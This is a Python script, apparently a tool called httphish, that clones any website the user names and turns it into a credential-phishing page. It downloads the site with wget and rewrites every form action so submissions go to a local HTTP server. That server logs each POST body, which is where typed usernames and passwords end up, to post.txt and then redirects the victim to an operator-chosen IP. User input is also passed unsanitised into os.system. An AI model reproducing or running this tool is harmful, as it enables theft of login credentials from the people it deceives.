# Import statements
import os
import http.server
import socketserver
import re

# TODO : ADD SSL SUPPORT

####################
###   CONSTANTS  ###
####################

BANNER = '''
  _     _   _         _     _     _                   
 | |__ | |_| |_ _ __ | |__ (_)___| |__    _ __  _   _ 
 | '_ \\| __| __| '_ \\| '_ \\| / __| '_ \\  | '_ \\| | | |
 | | | | |_| |_| |_) | | | | \\__ \\ | | |_| |_) | |_| |
 |_| |_|\\__|\\__| .__/|_| |_|_|___/_| |_(_) .__/ \\__, |
               |_|                       |_|    |___/                                             
'''
CURRENT_PATH = os.getcwd()
WEB_PATH = os.path.join(CURRENT_PATH, 'web')
INDEX_PATH = os.path.join(WEB_PATH, 'index.html')
POST_PATH = os.path.join(CURRENT_PATH, 'post.txt')
DEFAULT_USER_AGENT = "\"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/60.0\""
PORT = 80

#################
###   INPUT   ###
#################

os.system("clear")
print(BANNER)

# TODO : Add option to download webpage manually

url = input("What is the FULL URL you want to copy : ")

redirect_ip = input("What is the IP you want to redirect to : ")

yes = {'yes','y', 'ye'}
user_agent_change = input("Change default user agent? (y/N) : ")
if user_agent_change.lower() in yes:
    user_agent = input("User agent : ")
else:
    user_agent = DEFAULT_USER_AGENT

###################
###  WEB CRAWL  ###
###################

print("\n[*] Downloading web page with wget ...")

# Use wget command to download
os.system("wget -E -H -k -K -p -nH -nv {} --user-agent {} --directory-prefix={}".format(url, user_agent, WEB_PATH))

print("[*] Done.\n")

# Make sure index.html exists

if not os.path.isfile(INDEX_PATH):
    html_files_in_web = []
    for file in os.listdir(WEB_PATH):
        if file.endswith(".html") or file.endswith(".htm"):
            html_files_in_web.append(os.path.join(WEB_PATH, file))
    
    if len(html_files_in_web) == 1:
        os.rename(os.path.join(WEB_PATH, html_files_in_web[0]), INDEX_PATH)
    else:
        index_filename = input("[*] Which file in /web should be used as index.html? (filename only) :")
        print("\n [*] Renaming file ...")
        os.rename(os.path.join(WEB_PATH, index_filename), INDEX_PATH)
        print("[*] Done.\n")


#########################
###  EDIT HTML FORMS  ###
#########################

print("[*] Editing HTML index file ...")
html_as_str = open(INDEX_PATH, 'r').read()

# Yes, I do in fact parse HTML with Regex, I know.

forms_pattern = '(<form[^>]*?action=")([^"]*)("[^>]*>)'
html_as_str = re.sub(forms_pattern, r'\1\\\3', html_as_str)

with open(INDEX_PATH, 'wb') as file:
    file.write(str.encode(html_as_str))


print("[*] Done.")

######################
###   HTTP Server  ###
######################

# Custom SimpleHTTPRequestHandler where we edit the GET and POST actions and log messages
class SimpleHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        print("[*] GET request received!")
        f = self.send_head()
        if f:
            self.copyfile(f, self.wfile)
            f.close()

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])            # Get length of POST body
        body = self.rfile.read(content_length)                          # Read entire POST body
        self.send_response(303)                                         # Send HTTP 303 "see other" redirect response, more info: https://developer.mozilla.org/en-US/docs/Web/HTTP/Redirections
        self.send_header("Location", "http://{}".format(redirect_ip))   # Set the Location value in the HTTP response header to our redirect IP
        self.end_headers()                                              # End the HTTP header
        print("[*] POST request received!")                             # Print that we received a request
        with open(POST_PATH, 'a+') as file:                             # Open post.txt in append mode to add the entire POST request
            file.write(body.decode("utf-8"))
            file.write("\n\n")
        self.wfile.write(str.encode(""))

    def log_message(self, format, *args):
        return

os.chdir(WEB_PATH)
print("\n[*] Launching HTTP server ...")
httpd = socketserver.TCPServer(("", PORT), SimpleHTTPRequestHandler)
print("[*] Serving at port {}.".format(PORT))
print("[*] Use CTRL+C to exit and close the HTTP server.")
try:
    httpd.serve_forever()
except KeyboardInterrupt as error:
    print("\n[*] KeyboardInterrupt ...")
    httpd.server_close()
    print("\n[*] Server on port {} was shut down successfully.\n".format(PORT))
    print(error)
